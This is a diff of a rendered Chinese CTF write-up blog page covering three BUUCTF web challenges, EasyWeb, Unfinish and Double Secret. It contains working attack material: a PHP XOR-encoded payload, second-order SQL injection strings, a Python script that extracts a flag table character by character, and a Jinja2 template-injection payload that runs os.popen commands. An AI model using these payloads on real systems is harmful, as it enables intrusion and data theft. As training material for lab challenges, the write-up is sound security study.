@@ -54,6 +54,25 @@
 <meta property="og:image" content="http://example.com/img/wdb2018comment20.png">
 <meta property="og:image" content="http://example.com/img/wdb2018comment21.png">
 <meta property="og:image" content="http://example.com/img/encodeencode1.png">
+<meta property="og:image" content="http://example.com/img/suctf2019ezweb1.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish1.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish2.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish3.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish4.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish5.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish6.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish7.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish8.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish13.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish9.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish10.png">
+<meta property="og:image" content="http://example.com/img/wdbbbbbbbbbbunfinifh11.png">
+<meta property="og:image" content="http://example.com/img/wdbunfinish12.png">
+<meta property="og:image" content="http://example.com/img/doublescret1.png">
+<meta property="og:image" content="http://example.com/img/doublesecret2.png">
+<meta property="og:image" content="http://example.com/img/doublesecret3.png">
+<meta property="og:image" content="http://example.com/img/ciscndoublesrecreet1.png">
+<meta property="og:image" content="http://example.com/img/doublesecret5.png">
 <meta property="og:image" content="http://example.com/img/truecookbook1.png">
 <meta property="og:image" content="http://example.com/img/truecookbook2.png">
 <meta property="og:image" content="http://example.com/img/rutecookbook4.png">
@@ -63,7 +82,7 @@
 <meta property="og:image" content="http://example.com/img/xxewhat1.png">
 <meta property="og:image" content="http://example.com/img/hfctfjustescape1.png">
 <meta property="article:published_time" content="2023-11-29T12:08:50.000Z">
-<meta property="article:modified_time" content="2023-12-15T08:24:11.775Z">
+<meta property="article:modified_time" content="2023-12-16T04:00:43.870Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -236,7 +255,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          22k 字
+          21k 字
         
       </span>
     
@@ -247,7 +266,7 @@
         
         
         
-          187 分钟
+          180 分钟
         
       </span>
     
@@ -458,161 +477,78 @@
 <p><code>strrpos()</code> 函数查找字符串中最后一次出现的位置，然后使用 <code>substr()</code> 函数从该位置的下一个位置开始截取。</p>
 <p>正则匹配了<code>ph</code>(还是&#x2F;i模式)，这样一来php,phtml啥的后缀根本不要想了。<code>mb_strpos()</code> 函数在文件内容中搜索 <code>&lt;?</code> 字符串。如果找到了该字符串，则 <code>mb_strpos()</code> 函数返回字符串的位置，否则返回 <code>false</code>。</p>
 <p>参考<code>https://liotree.github.io/2019/08/21/EasyWeb/</code></p>
-<p><code>?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&%80=phpinfo`这东西其实就相当于：
-
-`?_=$&#123;_GET&#125;&#123;函数名&#125;();&函数名=phpinfo`
-
-![suctf2019ezweb1](img/suctf2019ezweb1.png)
-
-
-
-
-
-
-
-
-
-
-
-
-
-## [网鼎杯2018]Unfinish
-
-![wdbunfinish1](img/wdbunfinish1.png)
-
-`register.php`
-
-![wdbunfinish2](img/wdbunfinish2.png)
-
-sb火狐一直弹网站不安全害我注册登录不了。。
-
-![wdbunfinish3](img/wdbunfinish3.png)
-
-？
-
-抓包看下传输过程：
-
-![wdbunfinish4](img/wdbunfinish4.png)
-
-可以看到用户名密码直接明文传过去了，注册界面也一样：
-
-![wdbunfinish5](img/wdbunfinish5.png)
-
-![wdbunfinish6](img/wdbunfinish6.png)
-
-源码中会显示注册的用户名。
-
-这里想着没有注入点的话这个用户名能不能利用，去注册`a'#`发现注册不了？应该是触发了什么过滤。正常注册完应该是直接跳到`login`界面的。
-
-后面注册了一下`aa'`还是注册不了，又试了一下`aa''`发现能注册：
-
-![wdbunfinish7](img/wdbunfinish7.png)
-
-注意这里，我申请的是`aa''`但变成`aa'`了，有个单引号不知道跑哪里去了？
-
-单引号能注册大概率是存在转义函数，`''`进去变成了`\'\'`，这里回显的用户名应该是把转义后的拿出来了，后面测试了一下，单数的双引号无法注册，双数的单引号可以成功注册，但会吞掉一半的单引号。
-
-先想想吞单引号是怎么回事：
-
-`aa''` - > `aa\'\' ` ->  `aa'`
-
-首先用户名进去肯定被单引号包裹`'username'`，`aa''`进去之后转义成`aa\'\'`，存到数据库里还是怎么样。回显的时候把`aa\'\'`这东西给拿出来。那怎么做才会吞掉一个单引号呢？
-
-`aa''''` -> `aa''`
-
-后面去找了源码看看：
-
+<p><img src="/img/suctf2019ezweb1.png" srcset="/img/loading.gif" lazyload alt="suctf2019ezweb1"></p>
+<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><img src="/img/wdbunfinish1.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish1"></p>
+<p><code>register.php</code></p>
+<p><img src="/img/wdbunfinish2.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish2"></p>
+<p>sb火狐一直弹网站不安全害我注册登录不了。。</p>
+<p><img src="/img/wdbunfinish3.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish3"></p>
+<p>？</p>
+<p>抓包看下传输过程：</p>
+<p><img src="/img/wdbunfinish4.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish4"></p>
+<p>可以看到用户名密码直接明文传过去了，注册界面也一样：</p>
+<p><img src="/img/wdbunfinish5.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish5"></p>
+<p><img src="/img/wdbunfinish6.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish6"></p>
+<p>源码中会显示注册的用户名。</p>
+<p>这里想着没有注入点的话这个用户名能不能利用，去注册<code>a&#39;#</code>发现注册不了？应该是触发了什么过滤。正常注册完应该是直接跳到<code>login</code>界面的。</p>
+<p>后面注册了一下<code>aa&#39;</code>还是注册不了，又试了一下<code>aa&#39;&#39;</code>发现能注册：</p>
+<p><img src="/img/wdbunfinish7.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish7"></p>
+<p>注意这里，我申请的是<code>aa&#39;&#39;</code>但变成<code>aa&#39;</code>了，有个单引号不知道跑哪里去了？</p>
+<p>单引号能注册大概率是存在转义函数，<code>&#39;&#39;</code>进去变成了<code>\&#39;\&#39;</code>，这里回显的用户名应该是把转义后的拿出来了，后面测试了一下，单数的双引号无法注册，双数的单引号可以成功注册，但会吞掉一半的单引号。</p>
+<p>先想想吞单引号是怎么回事：</p>
+<p><code>aa&#39;&#39;</code> - &gt; <code>aa\&#39;\&#39; </code> -&gt;  <code>aa&#39;</code></p>
+<p>首先用户名进去肯定被单引号包裹<code>&#39;username&#39;</code>，<code>aa&#39;&#39;</code>进去之后转义成<code>aa\&#39;\&#39;</code>，存到数据库里还是怎么样。回显的时候把<code>aa\&#39;\&#39;</code>这东西给拿出来。那怎么做才会吞掉一个单引号呢？</p>
+<p><code>aa&#39;&#39;&#39;&#39;</code> -&gt; <code>aa&#39;&#39;</code></p>
+<p>后面去找了源码看看：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users(email,username,password) values(&#x27;&quot;</span>.<span class="hljs-variable">$email</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from users where email=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
 
-感觉这东西像二次注入+`insert`注入拼起来，但还是不知道怎么回事。。找机会问问别人╮(╯-╰)╭
-
-`1'and'0`:
-
-![wdbunfinish8](img/wdbunfinish8.png)
-
-单引号闭合，而且`1'and'0`这东西变成了`0`。
-
+<p>感觉这东西像二次注入+<code>insert</code>注入拼起来，但还是不知道怎么回事。。找机会问问别人╮(╯-╰)╭</p>
+<p><code>1&#39;and&#39;0</code>:</p>
+<p><img src="/img/wdbunfinish8.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish8"></p>
+<p>单引号闭合，而且<code>1&#39;and&#39;0</code>这东西变成了<code>0</code>。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>的字符串运算：数值相加<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&#x27;2&#x27;</span> <br># <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>hex(database())<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">776562</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> web的<span class="hljs-number">16</span>进制<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>##<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br>#参考：https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>blog.csdn.net<span class="hljs-operator">/</span>zzzgd_666<span class="hljs-operator">/</span>article<span class="hljs-operator">/</span>details<span class="hljs-operator">/</span><span class="hljs-number">121704012</span><br>#	  https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xz.aliyun.com<span class="hljs-operator">/</span>t<span class="hljs-operator">/</span><span class="hljs-number">10594</span><br></code></pre></td></tr></table></figure>
 
-![wdbunfinish13](img/wdbunfinish13.png)
-
-`0'+hex(database())+'0`
-
-![wdbunfinish9](img/wdbunfinish9.png)
-
-注意这里是十六进制，转换成字符串就是`web`
-
-爆表的话`information`这东西被正则匹配掉了，回显`nonono`。当时想着还能用`sys`库去代替`information_schema`：
-
-![wdbunfinish10](img/wdbunfinish10.png)
-
-先尝试`0'+hex(hex(version()))+'0`
-
-![wdbbbbbbbbbbunfinifh11](img/wdbbbbbbbbbbunfinifh11.png)
-
-出了这么个东西，使用两次`hex`主要就是为了消除`abcd`这种字母，而且因为长字符串转成数字型数据的时候会变成科学计数法导致也就是说会丢失数据精度，所以可以一位一位的截。`https://xz.aliyun.com/t/2619#toc-3`
-
-注意这个数据库的版本：(底下代码`select * from flag`换成`version()`就行)
-
-![wdbunfinish12](img/wdbunfinish12.png)
-
-师傅们的`wp`里都是直接`select * from flag`，`flag`这个表是猜出来的。。
-
+<p><img src="/img/wdbunfinish13.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish13"></p>
+<p><code>0&#39;+hex(database())+&#39;0</code></p>
+<p><img src="/img/wdbunfinish9.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish9"></p>
+<p>注意这里是十六进制，转换成字符串就是<code>web</code></p>
+<p>爆表的话<code>information</code>这东西被正则匹配掉了，回显<code>nonono</code>。当时想着还能用<code>sys</code>库去代替<code>information_schema</code>：</p>
+<p><img src="/img/wdbunfinish10.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish10"></p>
+<p>先尝试<code>0&#39;+hex(hex(version()))+&#39;0</code></p>
+<p><img src="/img/wdbbbbbbbbbbunfinifh11.png" srcset="/img/loading.gif" lazyload alt="wdbbbbbbbbbbunfinifh11"></p>
+<p>出了这么个东西，使用两次<code>hex</code>主要就是为了消除<code>abcd</code>这种字母，而且因为长字符串转成数字型数据的时候会变成科学计数法导致也就是说会丢失数据精度，所以可以一位一位的截。<code>https://xz.aliyun.com/t/2619#toc-3</code></p>
+<p>注意这个数据库的版本：(底下代码<code>select * from flag</code>换成<code>version()</code>就行)</p>
+<p><img src="/img/wdbunfinish12.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish12"></p>
+<p>师傅们的<code>wp</code>里都是直接<code>select * from flag</code>，<code>flag</code>这个表是猜出来的。。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">//参考https://www.cnblogs.com/upfine/p/<span class="hljs-number">16607426.</span>html<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;http://7d3b4912-e6bb-4111-b640-7ab9e2fea080.node4.buuoj.cn:81/&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <span class="hljs-comment"># 这行代码创建了一个BeautifulSoup对象，用于解析网页的HTML内容。response_login.text是一个包含网页HTML内容的字符串，&#x27;html.parser&#x27;是指定使用HTML解析器来解析网页</span><br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure>
 
-当然还有利用两次`hex`去转换的，原理和上面差不多:
-
-`0'%2B(select substr(hex(hex((select * from flag))) from 1 for 1))%2B'0`
-
-
-
-参考`https://syunaht.com/p/3379740036.html`
-
-`https://xz.aliyun.com/t/2619#toc-3`
-
-
-
-## [CISCN2019 华东南赛区]Double Secret
-
-![doublescret1](img/doublescret1.png)
-
-`dirsearch`没扫出来啥，试了试`/secret`:
-
-![doublesecret2](img/doublesecret2.png)
-
-`/secret?secret=1`
-
-![doublesecret3](img/doublesecret3.png)
-
-`/secret?secret=secret`，开了`Debug`，发现有这么段东西：
-
-![ciscndoublesrecreet1](img/ciscndoublesrecreet1.png)
-
+<p>当然还有利用两次<code>hex</code>去转换的，原理和上面差不多:</p>
+<p><code>0&#39;%2B(select substr(hex(hex((select * from flag))) from 1 for 1))%2B&#39;0</code></p>
+<p>参考<code>https://syunaht.com/p/3379740036.html</code></p>
+<p><code>https://xz.aliyun.com/t/2619#toc-3</code></p>
+<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/img/doublescret1.png" srcset="/img/loading.gif" lazyload alt="doublescret1"></p>
+<p><code>dirsearch</code>没扫出来啥，试了试<code>/secret</code>:</p>
+<p><img src="/img/doublesecret2.png" srcset="/img/loading.gif" lazyload alt="doublesecret2"></p>
+<p><code>/secret?secret=1</code></p>
+<p><img src="/img/doublesecret3.png" srcset="/img/loading.gif" lazyload alt="doublesecret3"></p>
+<p><code>/secret?secret=secret</code>，开了<code>Debug</code>，发现有这么段东西：</p>
+<p><img src="/img/ciscndoublesrecreet1.png" srcset="/img/loading.gif" lazyload alt="ciscndoublesrecreet1"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#解密，这个算法应该是RC4,然后密钥是HereIsTreasure</span><br>   deS=rc.do_crypt(secret) <span class="hljs-comment"># 加密secret</span><br><br>   a=render_template_string(safe(deS)) <span class="hljs-comment"># deS经过safe过滤然后渲染</span><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure>
 
-奇怪的是`rc=rc4_Modified.RC4("HereIsTreasure")`的注释是解密？
-
-`RC4`找了个网站：`http://tool.chacuo.net/cryptrc4`，这个结果是一致的(有些虽然也是`RC4`但结果不一样)：数据加密后是`base64`编码，然后把它解码就行了。
-
-后面看wp发现有大佬直接自己写脚本。。太强了orz：
-
+<p>奇怪的是<code>rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)</code>的注释是解密？</p>
+<p><code>RC4</code>找了个网站：<code>http://tool.chacuo.net/cryptrc4</code>，这个结果是一致的(有些虽然也是<code>RC4</code>但结果不一样)：数据加密后是<code>base64</code>编码，然后把它解码就行了。</p>
+<p>后面看wp发现有大佬直接自己写脚本。。太强了orz：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):<span class="hljs-comment">#返回加密后得内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密文</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br></code></pre></td></tr></table></figure>
 
 
 
-他这个加密过程大致是我们的输入`secret`经过`RC4`后是`base64`编码，然后渲染输出`base64`解码的结果。
-
-存在`render_template_string`，参数又是可控的，猜测是`SSTI`。
-
-我们需要让它`render_template_string`的参数是`payload`
-
-先试试`&#123;&#123;config&#125;&#125;`:`.%14ZZ%C2%A4%01%02iv%C2%80`
-
-![doublesecret5](img/doublesecret5.png)
-
-加密：
-
-`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
+<p>他这个加密过程大致是我们的输入<code>secret</code>经过<code>RC4</code>后是<code>base64</code>编码，然后渲染输出<code>base64</code>解码的结果。</p>
+<p>存在<code>render_template_string</code>，参数又是可控的，猜测是<code>SSTI</code>。</p>
+<p>我们需要让它<code>render_template_string</code>的参数是<code>payload</code></p>
+<p>先试试<code>&#123;&#123;config&#125;&#125;</code>:<code>.%14ZZ%C2%A4%01%02iv%C2%80</code></p>
+<p><img src="/img/doublesecret5.png" srcset="/img/loading.gif" lazyload alt="doublesecret5"></p>
+<p>加密：</p>
+<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
 <p><code>/secret?secret=.J%19S¥%15Km%2B%C2%94ÖS%C2%85%C2%8F¸%C2%97%0B%C2%90X5¤AßMD®%07%C2%8BSß7Ø%12Åré%1Bä*çwÛ%C2%9Eñh%1D%C2%82%25íô%06)%7Fðo%2C%C2%9E9%08Ç÷u.û%C2%95%14¿v%05%19j®LÚ-ãt¬%7FX%2C8L%C2%81ÑHÿöãÚõ%C2%9A¦%23%06§¸»¹ænyØÊj»%25X%15×%C2%84F%24%1As^%C2%9B×¤ j¥/%17%1Cßs¯6Å¥±.è¢Y!¨à%10%C2%8Aa]\%2BÎ°%C2%99à¾%C2%87-%10x ]Ú%0B%C2%882PãÜ%1A%3A%3Fæ² ¢Â¹%0F%0BÕG%23-é¢%19Å²%C2%8F&quot;î£%C2%93lÊ&#123;%03ù¶%C2%92×%11 Üîê%02`
 
 ![doublesecret4](img/doublesecret4.png)
@@ -746,8 +682,8 @@ sb火狐一直弹网站不安全害我注册登录不了。。
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/" title="BuuCTF做题记录_5">
-                        <span class="hidden-mobile">BuuCTF做题记录_5</span>
+                      <a href="/2023/11/29/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%9C%A8%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" title="代码审计：浅谈PHP可变变量">
+                        <span class="hidden-mobile">代码审计：浅谈PHP可变变量</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
